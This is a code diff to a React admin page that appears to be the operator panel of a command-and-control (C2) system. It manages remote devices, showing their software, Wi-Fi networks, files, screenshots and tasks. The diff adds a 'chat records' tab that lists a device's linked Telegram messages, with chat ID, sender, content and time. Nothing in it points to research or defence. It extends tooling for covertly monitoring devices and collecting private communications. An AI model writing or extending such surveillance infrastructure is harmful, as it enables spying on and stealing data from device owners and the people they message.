@@ -1,12 +1,14 @@
 import { PageContainer, ProCard } from '@ant-design/pro-components';
 import { useParams, useRequest } from '@umijs/max';
-import { Button, Card, Descriptions, message, Space, Tabs, Typography, Input, Table, Switch, Image, Badge, Alert, Select } from 'antd';
+import { Button, Card, Descriptions, message, Space, Tabs, Typography, Input, Table, Switch, Image, Badge, Alert, Select, Modal } from 'antd';
 import React, { useEffect, useState } from 'react';
 import { listC2DeviceVoByPageUsingPost, listSoftwareUsingGet, listWifiUsingGet } from '@/services/backend/c2DeviceController';
 import { listFilesUsingGet, requestScanUsingPost } from '@/services/backend/c2FileController';
 import { addC2TaskUsingPost, listC2TaskVoByPageUsingPost } from '@/services/backend/c2TaskController';
 import { listScreenshotsUsingGet } from '@/services/backend/c2Controller';
-import { ReloadOutlined, HistoryOutlined, PictureOutlined, PlayCircleOutlined, PauseCircleOutlined, CloudUploadOutlined, SearchOutlined, ArrowUpOutlined, FolderOpenOutlined, FileOutlined, DesktopOutlined } from '@ant-design/icons';
+import { listTgMessageVoByPageUsingPost } from '@/services/backend/tgMessageController';
+import { listTgAccountVoByPageUsingPost } from '@/services/backend/tgAccountController';
+import { ReloadOutlined, HistoryOutlined, PictureOutlined, PlayCircleOutlined, PauseCircleOutlined, CloudUploadOutlined, SearchOutlined, ArrowUpOutlined, FolderOpenOutlined, FileOutlined, DesktopOutlined, MessageOutlined } from '@ant-design/icons';
 
 const { Paragraph } = Typography;
 
@@ -481,6 +483,52 @@ const DownloadsTab = ({ uuid, autoRefresh }: { uuid: string; autoRefresh: boolea
     );
 };
 
+const ChatLogsTab = ({ device }: { device: any }) => {
+    const [messages, setMessages] = useState<any[]>([]);
+    const [loading, setLoading] = useState(false);
+    
+    const fetchMessages = async () => {
+        setLoading(true);
+        try {
+            const res = await listTgMessageVoByPageUsingPost({
+                current: 1,
+                pageSize: 20,
+                sortField: 'date',
+                sortOrder: 'descend'
+            });
+            setMessages(res?.data?.data?.records || []);
+        } catch (e) {
+            console.error(e);
+        } finally {
+            setLoading(false);
+        }
+    };
+
+    useEffect(() => {
+        fetchMessages();
+    }, [device]);
+
+    const columns = [
+        { title: 'Chat ID', dataIndex: 'chatId', key: 'chatId' },
+        { title: '发送者', dataIndex: 'fromId', key: 'fromId' },
+        { title: '内容', dataIndex: 'message', key: 'message' },
+        { title: '时间', dataIndex: 'date', key: 'date' },
+    ];
+
+    return (
+        <Space direction="vertical" style={{ width: '100%' }}>
+            <Alert message={`当前关联 TG ID: ${device?.currentTgId || '未关联'}`} type="info" showIcon />
+            <Table
+                loading={loading}
+                dataSource={messages}
+                columns={columns}
+                rowKey="id"
+                size="small"
+            />
+        </Space>
+    );
+};
+
 const C2DeviceDetail: React.FC = () => {
   const { id: uuid } = useParams<{ id: string }>();
   const [activeTab, setActiveTab] = useState('software');
@@ -573,6 +621,11 @@ const C2DeviceDetail: React.FC = () => {
           activeKey={activeTab}
           onChange={setActiveTab}
           items={[
+            { 
+                label: '聊天记录', 
+                key: 'chat_logs', 
+                children: <ChatLogsTab device={device} /> 
+            },
             { 
                 label: '软件列表', 
                 key: 'software', 
